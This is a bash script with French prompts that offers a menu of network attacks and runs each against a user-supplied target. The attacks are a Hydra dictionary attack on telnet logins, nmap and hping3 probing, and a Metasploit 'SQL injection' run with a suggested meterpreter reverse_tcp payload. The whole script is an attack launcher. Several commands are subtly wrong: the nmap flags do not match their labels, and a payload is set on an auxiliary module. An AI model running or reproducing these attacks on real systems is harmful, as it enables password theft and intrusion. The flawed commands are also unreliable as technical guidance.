#!/bin/bash

echo "Liste d'options d'attaques :"
echo "1. Dictionary attack on telnet service using hydra"
echo "2. nmap scan with TCP SYN and UDP probes"
echo "3. nmap scan with TCP RST probes"
echo "4. HTTP SQL injection using Metasploit"
echo "5. nmap scan on a specific port using hping3"
echo "6. Exit"

read -p "Choisissez une option (1-6) : " choice

case $choice in
    1)
        echo "Option 1 : Dictionary attack on telnet service using hydra"
        echo "----------------------------------------------------------"
        echo "Cette attaque utilise Hydra pour tenter une attaque par dictionnaire sur un service telnet."
        echo ""
        read -p "Entrez l'adresse IP de la cible : " target_ip
        read -p "Entrez le nom d'utilisateur : " username
        read -p "Entrez le chemin du fichier de mot de passe : " password_file
        hydra -l $username -P $password_file $target_ip telnet
        ;;
    2)
        echo "Option 2 : nmap scan with TCP SYN and UDP probes"
        echo "------------------------------------------------"
        echo "Cette attaque utilise nmap pour effectuer un scan de port avec des sondes TCP SYN et UDP."
        echo ""
        read -p "Entrez la plage d'adresses IP cible (ex. 192.168.1.1-50) : " target_ip
        nmap -sS -sU -T4 -A -v $target_ip
        ;;
    3)
        echo "Option 3 : nmap scan with TCP RST probes"
        echo "----------------------------------------"
        echo "Cette attaque utilise nmap pour effectuer un scan de port avec des sondes TCP RST."
        echo ""
        read -p "Entrez l'adresse IP cible : " target_ip
        nmap -Pn -n -sR -p 80 --send-eth --data-length 1000 -M 1000 $target_ip
        ;;
    4)
        echo "Option 4 : HTTP SQL injection using Metasploit"
        echo "----------------------------------------------"
        echo "Cette attaque utilise Metasploit pour effectuer une injection SQL via HTTP."
        echo ""
        read -p "Entrez l'adresse IP cible : " target_ip
        read -p "Entrez le port cible : " target_port
        read -p "Entrez l'URI cible (ex. /login.php) : " target_uri
        read -p "Entrez le payload (ex. generic/meterpreter/reverse_tcp) : " payload
        msfconsole -q -x "use auxiliary/scanner/http/sql_injection;
                  set RHOSTS $target_ip;
                  set RPORT $target_port;
                  set TARGETURI $target_uri;
                  set PAYLOAD $payload;
                  run;"
        ;;
    5)
        echo "Option 5 : nmap scan on a specific port using hping3"
        echo "----------------------------------------------------"
        echo "Cette attaque utilise hping3 pour effectuer un scan de port sur un port spécifique."
        echo ""
        read -p "Entrez l'adresse IP cible : " target_ip
        read -p "Entrez le port cible : " target_port
        read -p "Entrez la taille du paquet : " packet_size
        read -p "Entrez le nombre de paquets : " num_packets
        echo ""
        echo "Exécution de la commande hping3 avec les paramètres suivants :"
        echo "- adresse IP cible : $target_ip"
        echo "- port cible : $target_port"
        echo "- taille du paquet : $packet_size"
        echo "- nombre de paquets : $num_packets"
        echo ""
        hping3 $target_ip -c $num_packets -S -p $target_port -d $packet_size
        ;;
    6)
        echo "Bye!"
        exit 0
        ;;
    *)
        echo "Option invalide"
        exit 1
        ;;
esac
